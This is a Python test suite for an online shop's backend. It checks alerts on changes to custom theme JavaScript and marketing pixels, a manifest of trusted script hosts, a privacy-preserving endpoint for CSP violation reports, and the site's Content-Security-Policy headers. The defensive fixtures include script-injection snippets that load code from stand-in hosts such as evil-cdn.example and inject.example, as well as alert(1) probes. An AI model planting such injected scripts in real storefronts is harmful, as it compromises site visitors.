"""T19 / ADM-08 — storefront code publish monitoring + CSP violation reports.

* Every change of custom theme JS/CSS or of a marketing pixel's snippet/active state raises a
  security event (chained audit record + alert to super admins).
* A script-host manifest is kept; a host that was not in the manifest raises an extra
  "new script host" alert and is then recorded in the manifest.
* POST /api/custom-theme/csp-report (public): body cap, per-IP + global rate limits, aggregated
  counters only (no IP / UA / query strings stored); a first-seen script-src violation from a host
  outside the manifest alerts.
* frontend/public/_headers serves an ENFORCING CSP (host allowlist, object-src 'none', base-uri,
  frame-ancestors, form-action, no wildcard script source) plus a stricter Report-Only policy without
  'unsafe-inline' (inline-script hashes); both report to that endpoint and their counters are kept
  apart (enforce vs report disposition). Cloudflare's 2000-char header-line limit is respected.
"""
from __future__ import annotations

import json
from pathlib import Path

import pytest

from conftest import KvUsers, kv_ip
from kv_harness import kv_find, kv_findall, kv_count

THEME = "/api/admin/custom-theme"
PIXELS = "/api/marketing-pixels"
CSP = "/api/custom-theme/csp-report"
REPO = Path(__file__).resolve().parents[3]


def _alerts(kind):
    return kv_findall("alerts", {"kind": kind})


def _audit(action):
    return kv_findall("audit_logs", {"action": action})


def test_custom_js_change_alerts_every_time_and_new_host_alerts(kv_client, kv_users):
    sa = kv_users.staff(super_admin=True)
    h = KvUsers.hdr(sa)
    r = kv_client.put(THEME, headers=h, json={"custom_css": "body{color:red}", "custom_js": "", "js_enabled": False})
    assert r.status_code == 200
    assert len(_alerts("storefront_script_changed")) == 1
    assert not _alerts("script_host_new")
    js = "var s=document.createElement('script');s.src='https://evil-cdn.example/x.js';document.head.appendChild(s)"
    r = kv_client.put(THEME, headers=h, json={"custom_css": "body{color:red}", "custom_js": js, "js_enabled": True})
    assert r.status_code == 200
    assert len(_alerts("storefront_script_changed")) == 2
    new = _alerts("script_host_new")
    assert len(new) == 1 and "evil-cdn.example" in new[0]["body"]
    assert "evil-cdn.example" in kv_find("settings", {"id": "script_host_manifest"})["hosts"]
    assert _audit("security.storefront_script_changed") and _audit("security.script_host_new")
    # the code body itself is never copied into the alert / audit (hash + length only)
    assert "createElement" not in json.dumps(kv_findall("alerts", {}), ensure_ascii=False)
    # an edit that keeps the same host → change alert, but no new-host alert
    r = kv_client.put(THEME, headers=h, json={"custom_css": "", "custom_js": js + ";1", "js_enabled": True})
    assert r.status_code == 200
    assert len(_alerts("storefront_script_changed")) == 3 and len(_alerts("script_host_new")) == 1
    # identical save → no alert
    kv_client.put(THEME, headers=h, json={"custom_css": "", "custom_js": js + ";1", "js_enabled": True})
    assert len(_alerts("storefront_script_changed")) == 3


def test_custom_theme_requires_super_admin(kv_client, kv_users):
    staff = kv_users.staff(perms=["settings.view", "settings.edit", "tasarim.edit"])
    r = kv_client.put(THEME, headers=KvUsers.hdr(staff), json={"custom_js": "alert(1)", "js_enabled": True})
    assert r.status_code == 403
    assert not _alerts("storefront_script_changed")
    assert kv_find("settings", {"id": "custom_theme"}) is None


def test_pixel_snippet_change_and_new_host(kv_client, kv_users):
    sa = kv_users.staff(super_admin=True)
    h = KvUsers.hdr(sa)
    r = kv_client.post(PIXELS, headers=h, json={"provider": "ga4", "tag_id": "G-TEST123", "is_active": True})
    assert r.status_code == 200, r.text
    pid = r.json()["pixel"]["id"]
    assert len(_alerts("storefront_script_changed")) == 1
    # first manifest baseline = state BEFORE the change → GA host is reported as new once
    assert any("googletagmanager.com" in a["body"] for a in _alerts("script_host_new"))
    n_new = len(_alerts("script_host_new"))
    # CAPI-only change (no snippet change) → no storefront alert
    r = kv_client.post(PIXELS, headers=h, json={"id": pid, "provider": "ga4", "tag_id": "G-TEST123",
                                                 "is_active": True, "capi_enabled": True,
                                                 "head_snippet": r.json()["pixel"]["head_snippet"],
                                                 "body_snippet": r.json()["pixel"]["body_snippet"]})
    assert r.status_code == 200
    assert len(_alerts("storefront_script_changed")) == 1
    # custom pixel adds an unknown host
    r = kv_client.post(PIXELS, headers=h, json={"provider": "custom", "name": "x", "is_active": True,
                                                 "head_snippet": '<script src="//tracker.unknown-host.example/t.js"></script>'})
    assert r.status_code == 200
    assert len(_alerts("storefront_script_changed")) == 2
    assert len(_alerts("script_host_new")) == n_new + 1
    assert "tracker.unknown-host.example" in _alerts("script_host_new")[-1]["body"]
    # deletion of an active pixel is a storefront change as well
    r = kv_client.delete(f"{PIXELS}/{pid}", headers=h)
    assert r.status_code == 200
    assert len(_alerts("storefront_script_changed")) == 3


def test_pixel_write_requires_super_admin(kv_client, kv_users):
    staff = kv_users.staff(perms=["marketing.view", "marketing.edit", "settings.edit"])
    r = kv_client.post(PIXELS, headers=KvUsers.hdr(staff),
                       json={"provider": "custom", "head_snippet": "<script>alert(1)</script>"})
    assert r.status_code == 403
    assert kv_count("marketing_pixels") == 0 and not _alerts("storefront_script_changed")


def test_host_extraction_unit():
    from routes.custom_theme import extract_script_hosts
    code = ('<script async src="https://www.googletagmanager.com/gtag/js?id=G-1"></script>'
            "<svg xmlns='http://www.w3.org/2000/svg'></svg>"
            "<img src=//px.ads.example/p.gif> // just a comment, no host"
            "fetch('wss://socket.example.org:8443/x')")
    assert extract_script_hosts(code) == {"www.googletagmanager.com", "px.ads.example", "socket.example.org"}


def test_selftest_detects_db_direct_script_host_drift(kv_client, kv_users):
    from routes.deps import db
    from conftest import kv_run
    from security import selftest
    sa = kv_users.staff(super_admin=True)
    kv_client.put(THEME, headers=KvUsers.hdr(sa), json={"custom_js": "x()", "js_enabled": True})
    st, _ = kv_run(selftest._c_script_manifest(db))
    assert st == "ok"
    # bypass the API: inject a script host straight into the DB
    kv_run(db.settings.update_one({"id": "custom_theme"},
                                  {"$set": {"custom_js": "s.src='https://inject.example/x.js'"}}))
    st, detail = kv_run(selftest._c_script_manifest(db))
    assert st == "fail" and "inject.example" in detail


# ─────────────────────────────── CSP report endpoint ───────────────────────────────
def _report(blocked="https://evil.example/x.js", directive="script-src-elem",
            doc="https://www.shop.example/odeme?token=secret-abc"):
    return {"csp-report": {"document-uri": doc, "violated-directive": directive,
                           "effective-directive": directive, "blocked-uri": blocked,
                           "source-file": "https://www.shop.example/static/js/main.js",
                           "disposition": "report"}}


def test_csp_report_aggregates_without_personal_data(kv_client):
    hdr = {**kv_ip(), "content-type": "application/csp-report", "user-agent": "Mozilla/5.0 KvAgent"}
    for _ in range(3):
        r = kv_client.post(CSP, content=json.dumps(_report()), headers=hdr)
        assert r.status_code == 204
    rows = kv_findall("csp_violation_stats", {})
    assert len(rows) == 1
    row = rows[0]
    assert row["count"] == 3 and row["blocked_host"] == "evil.example" and row["directive"] == "script-src-elem"
    assert row["last_page"] == "/odeme"
    dumped = json.dumps(rows)
    assert "secret-abc" not in dumped and "KvAgent" not in dumped and "203.0.113" not in dumped
    # first-seen script violation from a host outside the manifest → one alert (not per report)
    assert len(_alerts("csp_script_violation")) == 1
    # Reporting API format (application/reports+json) is accepted too
    r = kv_client.post(CSP, headers={**kv_ip(), "content-type": "application/reports+json"}, content=json.dumps(
        [{"type": "csp-violation", "body": {"documentURL": "https://www.shop.example/", "effectiveDirective": "img-src",
                                            "blockedURL": "https://pixel.example/p.gif", "disposition": "report"}}]))
    assert r.status_code == 204
    assert kv_find("csp_violation_stats", {"blocked_host": "pixel.example"})["count"] == 1
    assert len(_alerts("csp_script_violation")) == 1      # img-src never alerts


def test_csp_report_body_cap_and_garbage(kv_client):
    big = json.dumps(_report(blocked="https://x.example/" + "a" * 20000))
    r = kv_client.post(CSP, content=big, headers={**kv_ip(), "content-type": "application/csp-report"})
    assert r.status_code == 413
    r = kv_client.post(CSP, content=b"not json{", headers={**kv_ip(), "content-type": "application/csp-report"})
    assert r.status_code == 204
    assert kv_count("csp_violation_stats") == 0


def test_csp_report_rate_limited_per_ip_and_globally(kv_client, monkeypatch):
    hdr = {**kv_ip(), "content-type": "application/csp-report"}
    codes = [kv_client.post(CSP, content=json.dumps(_report()), headers=hdr).status_code for _ in range(70)]
    assert codes.count(429) >= 5 and codes[0] == 204
    # global per-process cap: beyond it reports are dropped (204) without DB writes
    import routes.custom_theme as ct
    from routes import deps
    deps.limiter.reset()
    monkeypatch.setattr(ct, "CSP_REPORT_GLOBAL_PER_MIN", 2)
    ct._csp_window.update({"minute": 0, "count": 0})
    from routes.deps import db
    from conftest import kv_run
    kv_run(db.csp_violation_stats.delete_many({}))
    for i in range(5):
        kv_client.post(CSP, content=json.dumps(_report(blocked=f"https://h{i}.example/x.js")),
                       headers={**kv_ip(), "content-type": "application/csp-report"})
    assert kv_count("csp_violation_stats") == 2


def test_csp_reports_admin_view_super_admin_only(kv_client, kv_users):
    kv_client.post(CSP, content=json.dumps(_report()), headers={**kv_ip(), "content-type": "application/csp-report"})
    staff = kv_users.staff(perms=["settings.view"])
    assert kv_client.get("/api/admin/custom-theme/csp-reports", headers=KvUsers.hdr(staff)).status_code == 403
    r = kv_client.get("/api/admin/custom-theme/csp-reports", headers=KvUsers.hdr(kv_users.staff(super_admin=True)))
    assert r.status_code == 200 and r.json()["items"][0]["blocked_host"] == "evil.example"


def _headers_lines():
    txt = (REPO / "frontend" / "public" / "_headers").read_text(encoding="utf-8")
    return txt, txt.splitlines()


def _header_value(name):
    _, lines = _headers_lines()
    hits = [x.strip().split(":", 1)[1].strip() for x in lines if x.strip().startswith(name + ":")]
    assert len(hits) == 1, f"{name}: exactly one definition expected, got {len(hits)}"
    return hits[0]


def test_headers_file_enforcing_csp_is_strict_enough_and_reports():
    from security.storefront_integrity import parse_csp, csp_flags, _script_sources
    enf = _header_value("Content-Security-Policy")
    csp = parse_csp(enf)
    assert csp_flags(csp) == {"present": True, "report": True, "object_src_none": True, "frame_ancestors": True,
                              "base_uri": True, "script_restricted": True}
    assert "report-uri https://api.meluni.com.tr/api/custom-theme/csp-report" in enf
    assert csp["default-src"] == ["'self'"] and csp["base-uri"] == ["'self'"]
    assert csp["frame-ancestors"] == ["'self'"] and csp["form-action"] == ["'self'", "https:"]
    script = _script_sources(csp)
    # 'unsafe-eval' BİLİNÇLİ istisna (2026-10-08): GTM Özel JavaScript değişkenleri (Google Ads dönüşüm
    # tutarı/para birimi/sipariş no) eval ile çalışır; yoksa dönüşümler 0 TL gider. Joker/şema yine yasak.
    assert "*" not in script and "https:" not in script
    # the legit third parties observed on the live site (incl. Cloudflare Web Analytics) are allowed
    for host in ("https://*.googletagmanager.com", "https://connect.facebook.net", "https://analytics.tiktok.com",
                 "https://*.posthog.com", "https://static.cloudflareinsights.com"):
        assert host in script, host
    assert "https://api.meluni.com.tr" in csp["connect-src"] and "https://cloudflareinsights.com" in csp["connect-src"]
    # every line within Cloudflare's 2000-character limit
    txt, lines = _headers_lines()
    assert max(len(x) for x in lines) <= 2000
    # admin is served by the same Pages project: both policies sit on the /* rule (covers /admin*)
    block = txt.split("\n/*\n", 1)[1].split("\n\n", 1)[0]
    assert "  Content-Security-Policy: " in block and "  Content-Security-Policy-Report-Only: " in block


def test_headers_file_strict_report_only_measures_unsafe_inline_removal():
    from security.storefront_integrity import parse_csp
    ro = parse_csp(_header_value("Content-Security-Policy-Report-Only"))
    script = ro["script-src"]
    assert "'unsafe-inline'" not in script and any(s.startswith("'sha256-") for s in script)
    assert ro["report-uri"] == ["https://api.meluni.com.tr/api/custom-theme/csp-report"]
    # same host allowlist as the enforcing policy (only the inline handling differs)
    enf = parse_csp(_header_value("Content-Security-Policy"))
    hosts = lambda srcs: {s for s in srcs if s.startswith("https://")}  # noqa: E731
    assert hosts(script) == hosts(enf["script-src"])
    # /version.json (build identity) must never be served from cache
    txt, _ = _headers_lines()
    assert "/version.json\n  Cache-Control: no-cache" in txt


def test_csp_report_counters_keep_enforce_and_report_apart(kv_client):
    hdr = {**kv_ip(), "content-type": "application/csp-report"}
    rep = _report()
    enf = json.loads(json.dumps(rep))
    enf["csp-report"]["disposition"] = "enforce"
    for body in (rep, enf, enf):
        assert kv_client.post(CSP, content=json.dumps(body), headers=hdr).status_code == 204
    rows = {r["disposition"]: r for r in kv_findall("csp_violation_stats", {})}
    assert set(rows) == {"report", "enforce"}
    assert rows["report"]["count"] == 1 and rows["enforce"]["count"] == 2


def test_csp_same_host_from_both_policies_and_files_alerts_once_per_day(kv_client):
    """Zorlayıcı + Report-Only politika aynı engeli iki rapor olarak gönderir → TEK e-posta."""
    for disp in ("enforce", "report"):
        for src in ("https://www.shop.example/static/js/main.js", "https://www.shop.example/static/js/2.js"):
            rep = _report(blocked="https://ads.example/t.js")
            rep["csp-report"]["disposition"] = disp
            rep["csp-report"]["source-file"] = src
            r = kv_client.post(CSP, content=json.dumps(rep),
                               headers={**kv_ip(), "content-type": "application/csp-report"})
            assert r.status_code == 204
    assert len(kv_findall("csp_violation_stats", {"blocked_host": "ads.example"})) == 2   # politika başına ayrı sayaç
    assert len(_alerts("csp_script_violation")) == 1


def test_csp_extension_injected_script_is_counted_but_not_alerted(kv_client):
    rep = _report(blocked="https://adware.example/inject.js")
    rep["csp-report"]["source-file"] = "chrome-extension://abcdefghijklmnop/content.js"
    r = kv_client.post(CSP, content=json.dumps(rep), headers={**kv_ip(), "content-type": "application/csp-report"})
    assert r.status_code == 204
    assert kv_find("csp_violation_stats", {"blocked_host": "adware.example"})["count"] == 1
    assert not _alerts("csp_script_violation")
